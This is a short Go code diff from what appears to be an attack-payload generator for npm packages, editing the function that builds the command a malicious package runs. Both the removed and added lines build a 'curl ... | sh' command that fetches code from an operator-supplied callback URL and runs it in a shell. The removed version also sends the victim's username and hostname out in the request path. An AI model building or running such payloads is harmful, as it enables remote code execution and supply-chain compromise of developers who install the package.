@@ -45,7 +45,7 @@ func (n *NPMPayload) Generate() []GeneratedPayload {
 	var cmd string
 	switch {
 	case n.Options.CallbackURL != "":
-		cmd = fmt.Sprintf("curl -s %s/$(whoami)@$(hostname)|sh", n.Options.CallbackURL)
+		cmd = fmt.Sprintf("curl -s %s | sh", n.Options.CallbackURL)
 	case n.Options.Command != "":
 		cmd = n.Options.Command
 	default:
